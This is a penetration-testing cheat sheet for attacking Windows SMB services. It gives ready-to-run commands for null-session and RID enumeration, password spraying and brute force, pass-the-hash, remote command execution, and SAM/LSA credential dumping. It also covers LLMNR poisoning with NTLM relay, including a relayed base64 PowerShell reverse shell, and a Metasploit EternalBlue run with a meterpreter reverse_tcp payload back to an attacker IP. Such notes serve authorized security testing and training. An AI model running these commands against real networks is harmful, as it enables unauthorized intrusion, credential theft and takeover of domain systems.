# SMB (139, 445)

!!! tip "Start here"
    Check null session first: `netexec smb 10.10.10.10 -u '' -p ''`. If that fails, try `guest:guest`. Null sessions still work on older or misconfigured Windows hosts and give you share listings and sometimes user enumeration.

---

## Enumeration

```bash
nmap -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode 10.10.10.10
nxc smb 10.10.10.10
enum4linux-ng -A -C 10.10.10.10
```

---

## Authentication

Verify user privileges and acess on systems

```sh
nxc smb 10.10.10.100 -u localuser -p 'Password' --local-auth    # single auth
nxc smb 10.10.10.0/24 -u localuser -p 'Password' --local-auth   # subnet spray
nxc smb 10.10.10.100 -u Administrator -H 'hash' --local-auth    # pass the hash
```

By default, nxc will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list.

---

## User Enumeration

```bash
#  Lists users currently logged into the machine and which DC they connected to
nxc smb 10.10.10.10 -u <user> -p <password> --loggedon-users  # Use CIDR notation to scan subnets (10.10.10.0/24)

# RID brute — works on many DCs even with null/guest
nxc smb 10.10.10.10 -u '' -p '' --rid-brute
nxc smb 10.10.10.10 -u <user> -p <password> --rid-brute

# Authenticated user list
nxc smb 10.10.10.10 -u <user> -p <password> --users
enum4linux-ng -U 10.10.10.10

# Direct LSARPC
impacket-lookupsid 'EXAMPLE/<user>:<password>'@10.10.10.10
```

---

## Password Policy

Pull this *before* spraying — locking out ten domain users on the first day is a bad look.

```bash
nxc smb 10.10.10.10 -u <user> -p <password> --pass-pol
enum4linux-ng -P 10.10.10.10
```

---

## Share Enumeration

```bash
smbclient -N -L //10.10.10.10      # display shares using null session
smbclient -L //10.10.10.10 -U ''
smbclient -L //10.10.10.10 -U guest
nmap --script smb-enum-shares -p 445 10.10.10.10
nxc smb 10.10.10.10 --shares
```

Connect to a share:

```bash
smbclient //10.10.10.10/ShareName -U <user>
```

Download files once connected:

```bash
smb> get filename
smb> mget *
```

---

## smbmap

Enumerate shares and permissions, then read/write files without an interactive shell.

```bash
# enumerate shares (unauthenticated / authenticated)
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u <user> -p <password>

# recursive directory listing
smbmap -H 10.10.10.10 -u <user> -p <password> -r <ShareName>

# download a file (remote path uses backslashes)
smbmap -H 10.10.10.10 -u <user> -p <password> --download '<ShareName>\path\to\file.txt'

# upload a file (remote path uses backslashes)
smbmap -H 10.10.10.10 -u <user> -p <password> --upload /local/file.txt '<ShareName>\file.txt'

# pass-the-hash
smbmap -H 10.10.10.10 -u <user> -p '<lm>:<ntlm>'
```

---

## Share Spidering

Once you can read shares, recursively grep for credentials, configs, and key material.

```bash
# nxc spider — fast, regex-based, runs across multiple hosts
nxc smb 10.10.10.10 -u <user> -p <password> -M spider_plus
nxc smb 10.10.10.10 -u <user> -p <password> --spider <share> --regex 'password|secret|cred'

# manspider — heavier, greps file *contents* including office docs and PDFs
manspider 10.10.10.10 -u <user> -p <password> -c 'password' 'apikey' 'BEGIN PRIVATE KEY'
```

Files worth grepping for: `unattend.xml`, `sysprep.inf`, `*.kdbx`, `*.ps1`, `web.config`, `Groups.xml` (GPP cpassword).

---

## Brute Force

```bash
nxc smb 10.10.10.10 -u users.txt -p passwords.txt
hydra -L users.txt -P passwords.txt smb://10.10.10.10
```

---

## Pass-the-Hash

```bash
nxc smb 10.10.10.10 -u Administrator -H <ntlm-hash>
impacket-smbexec EXAMPLE/Administrator@10.10.10.10 -hashes :<ntlm-hash>
```

---

## Kerberos Authentication

When NTLM is disabled, restricted (e.g. account is in `Protected Users`), or you only have a TGT, every impacket tool accepts Kerberos:

```bash
# Mint a TGT from creds, hash, or AES key
getTGT.py EXAMPLE/<user>:<password>
getTGT.py EXAMPLE/<user> -hashes :<ntlm-hash>
getTGT.py EXAMPLE/<user> -aesKey <aes256-key>

# Use the cached ticket
export KRB5CCNAME=<user>.ccache
psexec.py -k -no-pass EXAMPLE/<user>@dc01.example.local
```

Target by FQDN (not IP) when using Kerberos — SPNs are tied to hostnames.

---

## Remote Command Execution

For one-off commands, `nxc -x` is the daily driver — it wraps the same execution methods as the impacket tools below, but runs across many hosts at once and handles cred spraying:

```bash
# CMD execution (default method is wmiexec — no service, no binary on disk)
nxc smb 10.10.10.10 -u <user> -p <password> -x 'whoami'

# PowerShell execution
nxc smb 10.10.10.10 -u <user> -p <password> -X 'Get-Process'

# Switch methods if one is blocked or detected
nxc smb 10.10.10.10 -u <user> -p <password> --exec-method smbexec -x 'whoami'
nxc smb 10.10.10.10 -u <user> -p <password> --exec-method atexec -x 'whoami'
```

Reach for the impacket tools when you need an **interactive shell** — `nxc -x` runs each command in a fresh session, so you can't `cd` and have state persist. Same underlying mechanisms, different UX:

```bash
# Full SYSTEM shell — drops binary + creates service (noisy, but reliable)
impacket-psexec user:'password'@10.10.10.10

# DCOM/WMI semi-interactive — quieter than psexec
impacket-wmiexec user:'password'@10.10.10.10

# Semi-interactive via SMB named pipes — no binary on disk
impacket-smbexec user:'password'@10.10.10.10

# One-shot via scheduled task — useful when 445 is filtered but RPC/135 is open
impacket-atexec user:'password'@10.10.10.10 'whoami'
```

All accept `-hashes :<ntlm-hash>` for pass-the-hash and `-k -no-pass` for Kerberos with a cached ticket.

---

## Credential Dumping

```bash
nxc smb 10.10.10.100 -u localuser -p 'Password' --sam
```

CIDR notation can be used instead to spray a subnet (10.10.10.0/24)
Use `--lsa` in addition to the command above to dump SAM and LSA simultaneously


```bash
impacket-secretsdump EXAMPLE/<user>@10.10.10.10
impacket-secretsdump EXAMPLE/<user>@10.10.10.10 -hashes :<ntlm-hash>
```

---

## Forced Authentication

When a Windows host can't resolve a name via DNS, it falls back to multicast: **LLMNR**, **NBT-NS**, **mDNS**. Anything on the broadcast domain can answer and impersonate the requested host. The victim then sends a NetNTLMv2 authentication attempt to the attacker, which can be cracked offline or relayed live. Common trigger: a user mistypes a UNC path (`\\fileshare` → `\\fileshre`).

### Capture

Run in *analyze mode* first — passively observes poisonable traffic without spoofing, useful for confirming the attack is viable before being noisy:

```bash
sudo responder -I eth0 -A
```

Then run for real:

```bash
sudo responder -I eth0
```

Captured hashes land in `/usr/share/responder/logs/` (one file per protocol/host). A NetNTLMv2 hash looks like:

```
demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A...:01010000...
```

Crack with hashcat — mode `5600` for NetNTLMv2, `5500` for NetNTLMv1:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

!!! tip "Multiple hashes for one user"
    NetNTLMv2 includes a randomized client+server challenge, so the same password produces a different hash each capture. They all crack to the same plaintext.

### Relay

If the password is strong, *relay* the auth to a target that doesn't enforce SMB signing instead of cracking it. Disable Responder's own SMB (and HTTP, if relaying HTTP-triggered auth) so the auth passes through to ntlmrelayx:

```bash
# /etc/responder/Responder.conf
SMB  = Off
HTTP = Off
```

Build the relay target list (only hosts where signing is not required):

```bash
nxc smb 10.10.10.10/24 --gen-relay-list relay_targets.txt
```

Then run responder and ntlmrelayx side by side:

```bash
# Default behavior: dump SAM as the relayed user (needs local admin on target)
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10

# Execute a command — paste a base64-encoded PowerShell rev shell from revshells.com
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10 -c 'powershell -e <base64>'

# Multi-target list
impacket-ntlmrelayx --no-http-server -smb2support -tf relay_targets.txt
```

!!! tip "Real-world"
    LLMNR and NBT-NS are usually disabled by GPO in well-managed environments; mDNS rarely is. One misconfigured host or one user mistyping a share name is enough. When you already have low-priv creds and want to force auth from a specific target, pair this with coercion (`PetitPotam.py`, `dfscoerce.py`, `coercer`) instead of waiting for organic mistypes.

---

## Known Vulnerabilities

### EternalBlue (MS17-010)

SMBv1 RCE. Still occasionally found on unpatched 2008 R2 / 7 boxes.

```bash
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.10
```

If vulnerable:

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
exploit
```

### SMBGhost (CVE-2020-0796)

SMBv3.1.1 compression bug — affects unpatched Windows 10 1903/1909 and Server 2004/1909. [POCs](https://www.exploit-db.com/exploits/48537) are kernel exploits and frequently crash the target; LPE PoCs are far more reliable.

```bash
nmap -p 445 --script smb-protocols 10.10.10.10   # confirm SMB 3.1.1 with compression
nxc smb 10.10.10.10 -M smbghost
```

### ZeroLogon (CVE-2020-1472)

Netlogon protocol — not strictly SMB, but it lives in the same DC-attack workflow.

```bash
nxc smb 10.10.10.10 -M zerologon
```

If vulnerable: back up the DC machine account hash with `secretsdump.py`, run a PoC that resets the machine password to empty, dump domain creds, then *restore* the original password to avoid breaking the DC.

!!! tip "Real-world"
    SMB is usually the first service worth digging into on internal assessments. Start with null/guest sessions, then move to credential spraying. NTLM relay is high-value when you can poison LLMNR — many networks still have LLMNR/NBT-NS enabled and no SMB signing enforced. Check signing with `nxc smb 10.10.10.10 --gen-relay-list relay_targets.txt`.

---

## Useful Links
[SANS SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)